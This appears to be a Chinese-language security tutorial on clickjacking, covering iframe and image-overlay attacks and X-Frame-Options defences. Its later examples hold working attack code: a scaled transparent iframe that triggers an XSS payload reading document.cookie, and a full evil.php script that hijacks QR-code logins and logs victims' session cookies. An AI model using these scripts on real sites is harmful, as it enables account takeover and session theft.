### 点击劫持

大概有两种方式：

- 一是攻击者使用一个透明的iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的iframe页面；


- 二是攻击者使用一张图片覆盖在网页，遮挡网页原有位置的含义；

#### iframe覆盖

~~~html
<!DOCTYPE HTML>
<html>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<head>
<title>点击劫持</title>
<style>
     html,body,iframe{
         display: block;
          height: 100%;
          width: 100%;
          margin: 0;
          padding: 0;
          border:none;
     }
     iframe{
          opacity:0;
          filter:alpha(opacity=0);
          position:absolute;
          z-index:2;
     }
     button{
          position:absolute;
          top: 315px;
          left: 462px;
          z-index: 1;
          width: 72px;
          height: 26px;
     }
</style>
</head>
     <body>
          那些不能说的秘密
          <button>查看详情</button>
          <iframe src="http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"></iframe>
     </body>
</html>
~~~

网址传播出去后，用户手贱点击了查看详情后，其实就会点到关注按钮

##### 解决办法

使用一个HTTP头——X-Frame-Options。X-Frame-Options可以说是为了解决ClickJacking而生的，它有三个可选的值：

DENY：浏览器会拒绝当前页面加载任何frame页面；

SAMEORIGIN：frame页面的地址只能为同源域名下的页面；

ALLOW-FROM origin：允许frame加载的页面地址；

###### Apache配置：

~~~http
Header always append X-Frame-Options SAMEORIGIN
~~~

nginx配置：

~~~http
add_header X-Frame-Options SAMEORIGIN;
~~~

IIS配置：

~~~http
<system.webServer>
    ...
    <httpProtocol>
        <customHeaders>
            <add name="X-Frame-Options" value="SAMEORIGIN" />
        </customHeaders>
    </httpProtocol>
    ...
</system.webServer>
~~~

#### 图片覆盖

攻击者使用一张或多张图片，利用图片的style或者能够控制的CSS，将图片覆盖在网页上，形成点击劫持。当然图片本身所带的信息可能就带有欺骗的含义，这样不需要用户点击，也能达到欺骗的目的。

可以输入HTML内容的地方加上一张图片，只不过将图片覆盖在指定的位置

~~~html
<a href="http://tieba.baidu.com/f?kw=%C3%C0%C5%AE">
     <img src="XXXXXX" style="position:absolute;top:90px;left:320px;" />
</a>
~~~

在防御图片覆盖攻击时，需要检查用户提交的HTML代码中，img标签的style属性是否可能导致浮出

#### 实例

##### 一.点击劫持+需要交互的XSS

某日寻到一个反射型xss,它是这样的：

https://www.xxx.com/aaa?returnUrl=javascript:(alert)()//

很遗憾的是，这个XSS 的触发条件有些复杂，不仅需要打开链接，还需要点击左上角的返回按钮才会触发。

但是谁会这么傻，点开这个链接发现不对劲后，再点左上角的 16px * 15px 的小按钮退出页面啊。。

于是今天的主角上场。

在我们的恶意网页中，用 iframe 加载此XSS链接，再用 css 把 iframe 放大 100 倍。

```
<style>
iframe {
    position: fixed; /* 绝对定位 */
    top: calc(-13px * 100);
    left: calc(-20px * 100); /* 按钮左上各有20px、13px空隙，此举使按钮出现在左上角 */
    transform-origin: 0 0 0; /* 放大中心设为左上角 */
    transform: scale(100); /* 放大100倍 */
}
</style>

<iframe src="https://www.xxx.com/aaa?returnUrl=javascript:(eval)(name)//" name="(alert)(document.cookie)" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>
```

此时可以看到左上角的按钮覆盖到了整个页面，当点击页面任意位置触发XSS。

之后就是透明化此 iframe 了。

```html
<style>
/* 此段copy自 【作者：米斯特安全攻防实验室-Vulkey_Chen 博客：gh0st.cn】*/
iframe {
    /*控制不透明度的属性，兼容各大浏览器*/
    filter: alpha(Opacity=0); /*提供给IE浏览器8之前的*/
    -moz-opacity: 0; /*提供给火狐浏览器的*/
    -webkit-opacity: 0; /*提供给webkit内核的*/
    -khtml-opacity: 0; /*提供给KHTML内核的*/
    -ms-filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=0)"; /*提供给IE8之后的*/
    opacity: 0;
    /*控制不透明度的属性，兼容各大浏览器*/
}
</style><style> iframe {position: fixed; /* 绝对定位 */top: calc(-13px * 100);left: calc(-20px * 100); /* 按钮左上各有20px、13px空隙，此举使按钮出现在左上角 */transform-origin: 0 0 0; /* 放大中心设为左上角 */transform: scale(100); /* 放大100倍 */ } </style> <iframe src="https://www.xxx.com/aaa?returnUrl=javascript:(eval)(name)//" name="(alert)(document.cookie)" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>
```

最后写上诱导点击的部分就行了。

PS. 实际利用过程，可以根据情况变通。如：一个页面需要先点按钮A，再点弹框按钮B 才可以触发。可以尝试变换 iframe 大小，使两个按钮 叠加在一起，之后再用CSS放大 iframe 200倍，实现两次点击页面任意位置触发XSS。

如图所示，把重叠部分左上角对齐，之后放大200倍。

两次点击页面任意位置触发XSS。

##### 二.点击劫持+二维码登录

某日留意到X网站网页端可以扫码登录。

手机APP扫码后，打开一个页面（url-A），点击确认后网页端即可登录。而且没做 点击劫持 防护。

url-A :http://www.xxx.com/qrcode?key=xxxxx

很简单，老思路，透明 iframe ，放大 200 倍。

【服务端】evil.php 从二维码登录接口获得 登录url-A、key，用iframe包含 url-A 发给别人，制造点击劫持，诱导他点击。

【用户端】当用户打开 evil.php ，被诱导点击任意位置后

【服务端】即可通过 key 获得新会话cookie。

evil.php 代码：

```php+HTML
<?php
$key = $_REQUEST['key'];

if(!$key){
//当$key为空，系第一次调用，输出点击劫持html

//从二维码登录接口获取登录json
$ch = curl_init();
$url = 'https://www.xxx.com/getLoginUrl';
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPGET, 1);
$o = curl_exec($ch);
curl_close($ch);

//解析json，获得登录url、oauthKey
$json=json_decode($o,true);
$key =  $json['data']['oauthKey'];
$url = $json['data']['url'];

//输出点击劫持html
echo sprintf('<html>
    <head></head>
<body height=100%% width=100%%>
<div>
<iframe src="%s" height="100%%" width="100%%" frameborder="no" border="0" marginwidth="0" marginheight="0" scrolling="no" allowtransparency="yes" style="position:fixed;transform-origin: 0 0 0;z-index:999;transform: scale(200);left:calc(-500px * 200);top:calc(-600px * 200);"></iframe>
</div>
<script>
    function check(){document.body.appendChild(document.createElement("img")).src="evil.php?key=%s&r="+Math.random();}
    setInterval("check()",1000);
</script>
</body>
</html>',$url,$key);

}else{
//当$key不为空，系二次调用，记录成功登录的cookie

//判断oauthKey对应的url是否登录（被点击）
$ch = curl_init();
$url = 'https://www.xxx.com/getLoginInfo';
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPGET, 0);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'oauthKey='.$key);
$o = curl_exec($ch);
curl_close($ch);

//记录日志
$msg = '<time>'.date("Y-m-d H:i:s").'</time><key>'.$key.'</key><data>'.$o.'</data>'.PHP_EOL;

//通过返回包是否含有 Set-Cookie 判断是否登录
//如果登录成功写入log.txt
if (strpos($o,'Set-Cookie',0)) 
file_put_contents("log.txt",$msg,FILE_APPEND);
}

?>
```

之后将evil.php的链接发到APP内显眼的地方。当别人被吸引打开此链接并点击页面任意区域，我们即可获得他的新会话cookie。

evil.php 实际上充当了二维码登录的中间人，要防范此类攻击，确认登录页面需要防护点击劫持。
